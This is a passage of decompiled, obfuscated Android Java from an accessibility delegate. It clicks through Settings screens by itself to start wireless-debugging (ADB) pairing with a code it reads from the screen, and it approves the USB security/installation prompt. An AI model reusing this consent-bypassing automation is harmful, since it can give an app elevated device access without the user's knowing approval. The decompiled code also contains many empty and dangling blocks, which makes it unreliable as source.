                                                        str4 = "USB安全设置栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str4);
                                                    z4 = false;
                                                    if (a0Var.f846u) {
                                                    }
                                                    if (z4) {
                                                    }
                                                    AtomicInteger atomicInteger3222222222 = new AtomicInteger(10);
                                                    while (!m998O) {
                                                    }
                                                    if (!a0Var.f846u) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                if (a0Var.f846u) {
                                                    Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                }
                                            }
                                            a0Var.f840o.remove("pairInPrepareFinish");
                                            break;
                                        }
                                        a0Var.D0();
                                        a0Var.f840o.remove("pairInPrepareFinish");
                                    } catch (Exception e6) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e6);
                                        return;
                                    }
                                    break;
                                case 3:
                                    a0Var.getClass();
                                    try {
                                        a0Var.f840o.remove("pairInPairSuccess");
                                        if (!a0.t0()) {
                                            a0Var.D0();
                                            break;
                                        } else {
                                            if (AbstractC0249e.m624m() && Build.VERSION.SDK_INT >= 35) {
                                                if (AbstractC0026q.m172b()) {
                                                    AbstractC0251g.T0(5);
                                                    if (!AbstractC0026q.m150A()) {
                                                        AbstractC0026q.m164O(null, null);
                                                    }
                                                }
                                                if (AbstractC0251g.f1()) {
                                                }
                                            }
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                                break;
                                            } catch (Exception e7) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e7);
                                                return;
                                            }
                                        }
                                    } catch (Exception e8) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e8);
                                        return;
                                    }
                                    break;
                                case 4:
                                    AtomicReference atomicReference2 = a0Var.f841p;
                                    try {
                                        if (!Objects.equals(atomicReference2.get(), enumC0894g3)) {
                                            a0Var.m1062G();
                                            Log.d("PairAccessibilityDelegate", "active root complete");
                                            atomicReference2.set(EnumC0894g.PAIR_DEPT_PAIR_LEAVE_DEV_OPT);
                                            a0.m985R(a0Var.m1072k());
                                            try {
                                                u02 = a0.u0();
                                                uiObject2 = null;
                                            } catch (Exception e9) {
                                                e = e9;
                                                uiObject2 = null;
                                            }
                                            while (uiObject2 == null) {
                                                try {
                                                } catch (Exception e10) {
                                                    e = e10;
                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e);
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                    return;
                                                }
                                                if (a0Var.m1072k() != null) {
                                                    uiObject2 = a0Var.m1072k().findOneByCombine(u02);
                                                    AbstractC0251g.T0(5);
                                                } else {
                                                    if (uiObject2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                    }
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                        AbstractC0184g.m354h(30);
                                                        UiObject findParentUtilCombine3 = uiObject3.findParentUtilCombine(a0.m987T());
                                                        if (findParentUtilCombine3 != null && findParentUtilCombine3.click()) {
                                                            Log.d("PairAccessibilityDelegate", "使用配对码配对栏目已点击");
                                                            AbstractC0184g.m354h(35);
                                                            break;
                                                        } else {
                                                            str6 = "使用配对码配对栏目点击失败";
                                                        }
                                                    } else {
                                                        str6 = "使用配对码配对栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                }
                                            }
                                            if (uiObject2 != null) {
                                            }
                                            uiObject3 = uiObject2;
                                            if (uiObject3 != null) {
                                            }
                                            Log.e("PairAccessibilityDelegate", str6);
                                        }
                                    } catch (Exception e11) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e11);
                                        return;
                                    }
                                    break;
                                case 5:
                                    a0Var.getClass();
                                    try {
                                        boolean m996M = a0Var.m996M();
                                        AtomicReference atomicReference3 = a0Var.f841p;
                                        String str7 = a0Var.f864c;
                                        if (m996M && !a0Var.m1000Q() && !Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            Object obj2 = atomicReference3.get();
                                            EnumC0894g enumC0894g4 = EnumC0894g.PAIR_DEPT_PAIRING;
                                            if (!Objects.equals(obj2, enumC0894g4)) {
                                                Log.d("PairAccessibilityDelegate", "pairInPairCodeDialog 窗口匹配");
                                                a0Var.m1062G();
                                                Log.d("PairAccessibilityDelegate", "active root complete");
                                                atomicReference3.set(enumC0894g4);
                                                Future m592b = AbstractC0243l.m592b(new CallableC0239h(a0Var), str7);
                                                if (m592b != null) {
                                                    while (!m592b.isDone()) {
                                                        Log.d("PairAccessibilityDelegate", "正在读取配对码和配对端口");
                                                        AbstractC0251g.T0(2);
                                                    }
                                                    try {
                                                        PairPortAndCodeResult pairPortAndCodeResult = (PairPortAndCodeResult) m592b.get();
                                                        if (pairPortAndCodeResult != null) {
                                                            Log.d("PairAccessibilityDelegate", "读取配对码和配对端口完成");
                                                            AbstractC0184g.m354h(40);
                                                            if (C0318e.m844S() != null) {
                                                                Log.d("PairAccessibilityDelegate", "正在发起配对");
                                                                C0318e.m844S().f615m.set(false);
                                                                C0318e.m844S().m852K(pairPortAndCodeResult.getHost(), pairPortAndCodeResult.getPairPort().intValue(), pairPortAndCodeResult.getPairCode());
                                                                if (C0318e.m844S().m860U()) {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对成功");
                                                                    AbstractC0184g.m354h(45);
                                                                    atomicReference3.set(enumC0894g3);
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对失败");
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "读取配对码和配对端口失败");
                                                        }
                                                    } catch (Exception e12) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e12);
                                                    }
                                                }
                                            }
                                        }
                                        if (!Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            atomicReference3.set(EnumC0894g.PAIR_DEPT_PAIR_FAIL);
                                        }
                                        if (a0Var.m996M()) {
                                            Log.e("PairAccessibilityDelegate", "配对结束,仍然停留在配对码窗口");
                                            if (atomicReference3.get() != enumC0894g3) {
                                                z6 = false;
                                            }
                                            AbstractC0243l.m592b(new CallableC0238g(z6, a0Var), str7);
                                            break;
                                        }
                                    } catch (Exception e13) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e13);
                                        return;
                                    }
                                    break;
                                case 6:
                                    a0Var.getClass();
                                    while (a0Var.m997N()) {
                                        try {
                                            UiObject findOneByCombine3 = a0Var.m1072k().findOneByCombine(a0.m989V());
                                            if (findOneByCombine3 != null && findOneByCombine3.click()) {
                                                Log.d("PairAccessibilityDelegate", "配对失败对话框确定按钮查找并点击完成");
                                                AbstractC0251g.T0(10);
                                            }
                                        } catch (Exception e14) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e14);
                                            return;
                                        }
                                    }
                                    ConcurrentLinkedQueue concurrentLinkedQueue2 = a0Var.f840o;
                                    concurrentLinkedQueue2.remove("pairInWifiDebugWindow");
                                    concurrentLinkedQueue2.remove("pairInPairCodeDialog");
                                    concurrentLinkedQueue2.remove("pairInPairFailDialog");
                                    break;
                                case 7:
                                    a0Var.getClass();
                                    while (a0Var.m1078q(C0420i.m1117L())) {
                                        try {
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                            } catch (Exception e15) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e15);
                                            }
                                            AbstractC0251g.T0(5);
                                        } catch (Exception e16) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e16);
                                        }
                                    }
                                    break;
                                default:
                                    a0Var.getClass();
                                    try {
                                        Log.d("PairAccessibilityDelegate", "pairInSecurityCenter 窗口匹配");
                                        UiObject findOneByCombine4 = a0Var.m1072k().findOneByCombine(a0.K0());
                                        if (findOneByCombine4 != null && findOneByCombine4.clickable() && findOneByCombine4.click()) {
                                            Log.d("PairAccessibilityDelegate", "USB安装设置窗口下一步按钮查找并点击完成");
                                            a0Var.f840o.remove("pairInSecurityCenter");
                                            break;
                                        } else {
                                            UiObject findOneByCombine5 = a0Var.m1072k().findOneByCombine(a0.J0());
                                            if (findOneByCombine5 != null) {
                                                Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮查找完成");
                                                if (findOneByCombine5.clickable()) {
                                                    Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮已可以点击");
                                                    if (findOneByCombine5.click()) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮点击完成");
                                                        AbstractC0251g.T0(10);
                                                        while (true) {
                                                            try {
                                                            } catch (Exception e17) {
                                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e17);
                                                            }
                                                            if (a0Var.m1072k() != null && a0Var.m1072k().findOneByCombine(a0.L0()) != null) {
                                                                Log.d("PairAccessibilityDelegate", "当前处于USB安全设置对话框");
                                                                z3 = true;
                                                                if (z3) {
                                                                    a0Var.f846u = true;
                                                                    a0Var.D0();
                                                                    break;
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "正在开启USB安全设置....");
                                                                    AbstractC0251g.T0(5);
                                                                }
                                                            }
                                                            z3 = false;
                                                            if (z3) {
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    } catch (Exception e18) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e18);
                                        return;
                                    }
                                    break;
                            }
                        }
                    }, str3);
                    return;
                }
                i2 = 0;
                if (i2 != 0) {
                }
            }
            z2 = false;
            if (!z2) {
            }
        } catch (Exception e4) {
            AbstractC0026q.m186s("PairAccessibilityDelegate", e4);
        }
    }
}
